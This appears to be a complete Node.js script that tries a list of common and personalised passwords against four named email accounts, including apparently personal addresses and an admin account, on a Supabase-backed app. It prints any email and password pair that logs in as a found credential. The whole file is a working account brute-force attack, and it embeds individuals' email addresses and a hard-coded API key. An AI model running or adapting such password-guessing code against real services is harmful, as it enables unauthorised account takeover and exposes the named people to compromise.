const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://iaxpabuuyffinfacmtty.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlheHBhYnV1eWZmaW5mYWNtdHR5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA4NzA2MjcsImV4cCI6MjEwNjQ0NjYyN30.ACbXC7XtDu0idLGko0QSA4EsqMl3LvbtFuif3m_s6Xw';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function testPasswords() {
  const emails = [
    'praveena.cs23@krct.ac.in',
    'rpraveena1110@gmail.com',
    'rkppraveena@gmail.com',
    'admin@subshare.app'
  ];

  const passList = [
    'Subshare@2026',
    'praveena123',
    'admin123',
    'Praveena@123',
    'subshare123',
    'password',
    '123456'
  ];

  for (const email of emails) {
    for (const pass of passList) {
      const { data, error } = await supabase.auth.signInWithPassword({ email, password: pass });
      if (!error && data?.session) {
        console.log(`✅ FOUND CREDENTIAL: ${email} -> password: '${pass}'`);
        break;
      }
    }
  }
}

testPasswords();
